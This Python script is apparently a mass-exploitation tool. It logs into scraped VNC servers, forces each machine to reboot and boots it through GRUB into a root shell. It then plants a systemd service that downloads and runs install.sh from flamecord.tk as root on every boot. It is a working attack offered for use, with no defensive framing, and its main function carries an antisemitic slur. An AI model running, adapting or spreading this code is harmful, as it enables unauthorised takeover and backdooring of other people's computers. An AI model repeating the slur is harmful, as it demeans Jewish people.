#!/usr/bin/env python3

import sys
import asyncio, asyncvnc
import scrape

shift_chars = {
    '~': '`', '!': '1', '@': '2', '#': '3', '$': '4', '%': '5', '^': '6', '&': '7',
    '*': '8', '(': '9', ')': '0', '_': '-', '+': '=', 'Q': 'q', 'W': 'w', 'E': 'e',
    'R': 'r', 'T': 't', 'Y': 'y', 'U': 'u', 'I': 'i', 'O': 'o', 'P': 'p', '{': '[',
    '}': ']', '|': '\\', 'A': 'a', 'S': 's', 'D': 'd', 'F': 'f', 'G': 'g', 'H': 'h',
    'J': 'j', 'K': 'k', 'L': 'l', ':': ';', '"': "'", 'Z': 'z', 'X': 'x', 'C': 'c',
    'V': 'v', 'B': 'b', 'N': 'n', 'M': 'm', '<': ',', '>': '.', '?': '/'
}

async def write(client, s):
    for c in s:
        if c in shift_chars: client.keyboard.press("Shift", c)
        else: client.keyboard.press(c)
        await asyncio.sleep(0.1)

async def reboot(client):
    for i in range(8): client.keyboard.press("Ctrl", "Alt", "Del")
    client.keyboard.press("Alt", "Print", "b")

async def grub_enter(client):
    for x in range(1000):
        with client.keyboard.hold("Esc"):
            await asyncio.sleep(0.1)
    client.keyboard.press("c")

async def grub_boot(client):
    for x in [
            "search --file --set=r /bin/sh;",
            "probe --set=u -u $r;",
            "insmod regexp;",
            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/vmlinu.*" "$b"; then set l=$b;fi;done;fi;if regexp ".*vmlinu.*" "$a"; then set l=$a;fi;done;',
            'regexp ".*vmlinu.(.*)" $l --set v',
            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/initr.*$v" "$b"; then set i=$b;fi;done;fi;if regexp ".*initr.*$v" "$a"; then set i=$a;fi;done;',
            "linux $l root=UUID=$u rw init=/bin/sh;",
            "initrd $i;",
            "boot;"
    ]:
        await write(client, x)
        await asyncio.sleep(0.5)
        client.keyboard.press("Return")
        await asyncio.sleep(7.5)

async def rootkit(client):
    await asyncio.sleep(20)
    for x in [
            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=sh -c \'(wget flamecord.tk/install.sh -O/install.sh || curl -L flamecord.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
            "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service;",
            "reboot -f;",
            "/sbin/reboot -f"
    ]:
        await write(client, x)
        await asyncio.sleep(0.5)
        client.keyboard.press("Return")
        await asyncio.sleep(7.5)

async def jew(ip, port, username, password):
    print(f"connecting to {ip}:{port}")
    async with asyncvnc.connect(ip, int(port), username, password) as client:
        print(f"connected to {ip}:{port}")
        await reboot(client)
        await grub_enter(client)
        await grub_boot(client)
        await rootkit(client)

async def main():
    tasks = [jew(vnc["HostIp"], vnc["Port"], vnc["Username"], vnc["Password"]) for vnc in scrape.get_vncs(*sys.argv[1:])]
    await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == '__main__':
    asyncio.run(main())
